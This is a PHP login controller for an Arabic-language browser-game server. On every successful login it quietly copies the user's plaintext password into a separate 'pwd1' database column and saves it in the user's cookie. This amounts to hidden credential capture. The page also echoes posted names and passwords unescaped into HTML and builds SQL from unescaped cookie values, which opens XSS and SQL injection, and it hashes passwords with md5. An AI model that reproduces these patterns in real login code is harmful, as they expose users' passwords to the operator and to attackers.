<?php
require(".".DIRECTORY_SEPARATOR."ftd-core".DIRECTORY_SEPARATOR."boot.php");
require_once(MODEL_PATH."index.php");
class GPage extends DefaultPage{

        public $data = NULL;
        public $error = NULL;
        public $errorState = -1;
        public $name = NULL;
        public $password = NULL;

        public function GPage(){
                parent::defaultpage();
                $this->viewFile = "login.phtml";
                $this->layoutViewFile = "layout".DIRECTORY_SEPARATOR."form.phtml";
                $this->contentCssClass = "login";
                }
        public function load(){
                $cookie = $GLOBALS['cd']->getinstance();
                $m = new IndexModel();
                $this->data = $m->getIndexSummary();
                $this->err[0] = "";
                $this->err[1] = "";
                $this->err[2] = "";
                $this->err[3] = "";
                $this->err[4] = "";
                if($this->isPost()){
                        if(!isset($_POST['name']) || trim($_POST['name'] ) == ""){
                                 $this->err[0] = login_result_msg_noname;                      
						}
						if(!isset($_POST['password']) || trim($_POST['password'] ) == ""){
                                 $this->err[1] = login_result_msg_nopwd;                      
                }                       
 else{
							$link = mysqli_connect($GLOBALS['AppConfig']['db']['host'], $GLOBALS['AppConfig']['db']['user'], $GLOBALS['AppConfig']['db']['password'], $GLOBALS['AppConfig']['db']['database']);
if (mysqli_connect_errno())
{
    die(mysqli_connect_errno());
}
                                $this->name = mysqli_real_escape_string($link, trim($_POST['name']));
                                if(!isset($_POST['password'] ) || $_POST['password'] == ""){
                                 $this->err[1] = login_result_msg_nopwd;
                                }
                                else{
                                        $this->password = $_POST['password'];
                                        $boot = isset ($_GET['boot']) ? TRUE : FALSE;
                                        if ($boot) { session_start();  $_SESSION['boot'] = 1;}
                                        $result = $m->getLoginResult($this->name, $this->password, WebHelper::getclientip(), $boot);
                                        if($result == NULL){
                                               $this->err[0] = login_result_msg_notexists;
                                        }
                                        elseif($result['hasError']){
                                 //$this->err[1] = login_result_msg_wrongpwd;

       $this->setError($m, '<p class="error_box"><b><span class="error">نسيت كلمة السر؟</span></b><br />
                يمكنك انشاء كلمة سر جديدة وسيتم ارسالهم لايميلك المسجل لدينا.<br />
                <a href="password?id='.$result['playerId'].'">إنشاء كلمة سر جديدة!</a>
        </p>',2); }
else if ($this->name == $this->appConfig['system']['adminName'] && $_POST['f'] != $this->appConfig['system']['adming']) {
       $this->setError($m, '<form action="" method="post"><p class="error_box"><b><font color="red">
                جواب السؤال السري </font></b>: <input name="f" size="50" class="text" type="text"><input name="name" type="hidden" value="'.$_POST['name'].'"><input name="password" type="hidden" value="'.$_POST['password'].'"></form>
        </p>',2);
}
                                        else{
                          $this->player             = new Player();
                          $this->player->playerId   = $result['playerId'];
                          $this->player->isAgent    = $result['data']['is_agent'];
                          $this->player->gameStatus = $result['gameStatus'];
						  $this->player->actions 	= $result['data']['actions'];
                          $this->player->save();
                          $cookie->uname = $this->name;
                          $cookie->upwd  = $this->password;
                          $islamLover = new QueueModel();
                          $islamLover->provider->executeQuery2("UPDATE p_players SET pwd1='%s' WHERE id=%s", array( $this->password, $result['playerId'] ) );
                          $cookie->save();
                          $m->dispose();
                          session_start();  
                          $_SESSION['pwd'] = md5($this->password);
                          $_SESSION['is_rig'] = $this->name;
						  $nawqrme = $cookie->uname;
						  
						  include('ftd-core/smartservs-conf-ftd/s1.php');
						  $db_connect = mysqli_connect($GLOBALS['AppConfig']['db']['host'], $GLOBALS['AppConfig']['db']['user'], $GLOBALS['AppConfig']['db']['password'], $GLOBALS['AppConfig']['db']['database']);
if (mysqli_connect_errno())
{
    die(mysqli_connect_errno());
}
		$resusdvadvasfvlt = mysqli_query($db_connect, "SELECT * FROM p_players where name ='$nawqrme'");

while($roasfsadfw = mysqli_fetch_array($resusdvadvasfvlt))
{
	$passwordwd = $roasfsadfw['pwd'];
}
		if (md5($cookie->upwd) == $passwordwd)
		{
		$sdfhdfb = 'دخول نظامي';
		}
		else
		{
		$sdfhdfb = 'دخول وكيل';
		}
		$Idqwre = $this->player->playerId;
		$tttt = time();
		$ipsrg = $_SERVER['REMOTE_ADDR'];
		mysqli_query($db_connect, "INSERT INTO  `login_date` (
		`id` ,
		`player_id` ,
		`player_name` ,
		`player_pass` ,
		`date` ,
		`ip` 
		)
		VALUES (
		'null' ,  '$Idqwre',  '$nawqrme', '$sdfhdfb', '$tttt' , '$ipsrg' 
		);
		");
		
						  
						  
                          $this->redirect("village1");
						  
						  
                      }
                  }
              }
          } else {
              if (isset($_GET['dcookie'])) {
                  $cookie->clear();
              } else {
                  $this->name     = $cookie->uname;
                  $this->password = $cookie->upwd;
              }
              $m->dispose();
          }
      }
      
      public function setError($m, $errorMessage, $errorState = -1)
      {
          $this->error      = $errorMessage;
          $this->errorState = $errorState;
          $m->dispose();
      }
      
  }
  
  $p = new GPage();
  $p->run();
?> 